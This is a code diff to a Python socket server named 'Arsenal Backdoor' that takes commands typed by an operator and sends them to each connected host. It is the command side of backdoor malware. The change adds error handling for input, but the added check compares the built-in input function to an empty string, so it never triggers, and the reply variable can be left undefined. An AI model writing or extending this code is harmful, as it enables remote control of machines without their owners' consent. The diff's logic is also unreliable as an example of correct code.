@@ -13,8 +13,13 @@ def client(conn, addr, buff):
     conn.send(b'Arsenal Backdoor\n')
     while True:
         data = conn.recv(buff)
-        print(addr[0]+':\n\r', str(data.strip(), 'utf-8'))
-        reply=input('Enter command for %s: ' %addr[0])
+        print(addr[0]+':\n', str(data.strip(), 'utf-8'))
+        try:
+            reply=input('Enter command for %s: ' %addr[0])
+        except ValueError:
+            print("Bad input")
+        if input == '':
+            continue
         if not data:
             break
         conn.send(bytes(reply, 'utf-8'))
